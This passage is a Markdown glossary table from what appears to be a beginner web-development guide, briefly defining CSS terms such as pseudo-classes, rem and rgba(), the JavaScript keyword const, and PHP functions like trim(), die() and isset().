| **Pseudo-class** | A CSS selector state like `:hover`, `:focus`, `:nth-child`. |
| **`rem`** | CSS unit relative to the root font size. `1rem` ≈ 16px. Scales with browser font settings. |
| **`rgba()`** | CSS colour with opacity: `rgba(0, 0, 0, 0.5)` = black at 50% transparency. |
| **`const`** | JavaScript keyword — declares a variable that cannot be reassigned. |
| **`trim()`** | PHP function that removes whitespace from the start and end of a string. |
| **`die()`** | PHP function that stops the script immediately and outputs a message. |
| **`isset()`** | PHP function that returns `true` if a variable exists and is not null. |
| **`(int)`** | PHP type cast — converts a value to an integer (whole number). |
